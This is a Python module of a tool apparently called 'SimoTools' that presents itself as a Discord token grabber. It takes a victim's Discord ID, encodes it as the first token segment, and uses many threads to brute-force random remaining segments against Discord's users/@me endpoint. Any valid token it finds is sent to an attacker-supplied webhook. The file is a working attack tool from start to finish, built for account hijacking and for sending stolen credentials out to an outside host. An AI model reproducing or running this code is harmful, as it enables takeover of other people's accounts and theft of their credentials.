from colorama import Fore, Style
import os
import sys
import time
import string
import requests
import json
import random
import threading
import base64
from utils.utils import clear, get_current_time, username, color
from utils.titles import title_discordtokengrabber

def discordtokengrabber():
    clear()
    print(getattr(Fore, color) + title_discordtokengrabber + Style.RESET_ALL)
    
    try:
        # Get victim's Discord ID
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Enter the victim's Discord ID{Style.RESET_ALL}")
        userid = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Victim ID > {Style.RESET_ALL}")
        
        # Check if user wants to return to main menu
        if userid.upper() == 'B':
            clear()
            # Return to main menu
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()
        
        # Generate first part of token from user ID
        OnePartToken = str(base64.b64encode(userid.encode("utf-8")), "utf-8").replace("=", "")
        print(f'{getattr(Fore, color)}[{get_current_time()}] [*] Part One Token: {Fore.WHITE}{OnePartToken}.{getattr(Fore, color)}{Style.RESET_ALL}')
        
        # Ask if user wants to brute force the second part
        brute = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Find the second part by brute force? (y/n) > {Style.RESET_ALL}")
        
        if not brute.lower() in ['y', 'yes']:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Operation cancelled. Returning to menu...{Style.RESET_ALL}")
            time.sleep(2)
            clear()
            # Return to main menu
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()
        
        # Ask if user wants to use a webhook
        webhook = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Use webhook? (y/n) > {Style.RESET_ALL}")
        webhook_url = None
        
        if webhook.lower() in ['y', 'yes']:
            webhook_url = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Webhook URL > {Style.RESET_ALL}")
            
            # Check if webhook is valid
            try:
                webhook_check = requests.get(webhook_url)
                if webhook_check.status_code != 200:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Invalid webhook URL! Continuing without webhook.{Style.RESET_ALL}")
                    webhook = 'n'
                else:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Webhook verified successfully!{Style.RESET_ALL}")
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Invalid webhook URL! Continuing without webhook.{Style.RESET_ALL}")
                webhook = 'n'
        
        # Get number of threads
        try:
            threads_number = int(input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Threads Number > {Style.RESET_ALL}"))
            if threads_number <= 0:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Invalid number! Using default value (5).{Style.RESET_ALL}")
                threads_number = 5
        except:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Invalid number! Using default value (5).{Style.RESET_ALL}")
            threads_number = 5
        
        # Define webhook settings
        username_webhook = "SimoTools Token Grabber"
        avatar_webhook = "https://i.imgur.com/4M34hi2.png"
        color_webhook = 16711680  # Red color
        
        # Function to send webhook
        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': username_webhook,
                'avatar_url': avatar_webhook
            }
            
            headers = {
                'Content-Type': 'application/json'
            }
            
            try:
                requests.post(webhook_url, data=json.dumps(payload), headers=headers)
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Failed to send webhook!{Style.RESET_ALL}")
        
        # Function to check if token is valid
        def token_check():
            first = OnePartToken
            second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
            third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
            token = f"{first}.{second}.{third}"
            
            try:
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook.lower() in ['y', 'yes']:
                        embed_content = {
                            'title': f'Token Valid!',
                            'description': f"**Token:**\n```{token}```",
                            'color': color_webhook,
                            'footer': {
                                "text": username_webhook,
                                "icon_url": avatar_webhook,
                            }
                        }
                        send_webhook(embed_content)
                        print(f"{Fore.GREEN}[{get_current_time()}] [+] Status: {Fore.WHITE}Valid{Fore.GREEN} Token: {Fore.WHITE}{token}{Fore.GREEN}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}[{get_current_time()}] [+] Status: {Fore.WHITE}Valid{Fore.GREEN} Token: {Fore.WHITE}{token}{Fore.GREEN}{Style.RESET_ALL}")
                else:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [-] Status: {Fore.WHITE}Invalid{getattr(Fore, color)} Token: {Fore.WHITE}{token}{getattr(Fore, color)}{Style.RESET_ALL}")
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Status: {Fore.WHITE}Error{getattr(Fore, color)} Token: {Fore.WHITE}{token}{getattr(Fore, color)}{Style.RESET_ALL}")
        
        # Function to create and manage threads
        def request():
            threads = []
            try:
                for _ in range(int(threads_number)):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Error creating threads!{Style.RESET_ALL}")
            
            for thread in threads:
                thread.join()
        
        # Main loop for token generation
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Starting token generation with {threads_number} threads{Style.RESET_ALL}")
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Press Ctrl+C to stop the process{Style.RESET_ALL}")
        
        try:
            attempts = 0
            while True:
                attempts += 1
                print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Attempt #{attempts}{Style.RESET_ALL}")
                request()
                
                # Ask if user wants to continue after each batch
                if attempts % 5 == 0:  # Ask every 5 attempts
                    print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Press Enter to continue or type 'B' to return to menu...{Style.RESET_ALL}")
                    user_input = input()
                    
                    if user_input.upper() == 'B':
                        clear()
                        # Return to main menu
                        script_dir = os.path.dirname(os.path.abspath(__file__))
                        main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
                        os.system(f'python "{main_path}"')
                        sys.exit()
        
        except KeyboardInterrupt:
            print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Token generation stopped by user.{Style.RESET_ALL}")
    
    except Exception as e:
        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Error: {Fore.WHITE}{str(e)}{getattr(Fore, color)}{Style.RESET_ALL}")
    
    print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Press Enter to continue or type 'B' to return to menu...{Style.RESET_ALL}")
    user_input = input()
    
    # Check if user wants to return to main menu
    if user_input.upper() == 'B':
        clear()
        # Return to main menu
        script_dir = os.path.dirname(os.path.abspath(__file__))
        main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
        os.system(f'python "{main_path}"')
        sys.exit()
    else:
        clear()
        # Return to main menu
        script_dir = os.path.dirname(os.path.abspath(__file__))
        main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
        os.system(f'python "{main_path}"')
        sys.exit()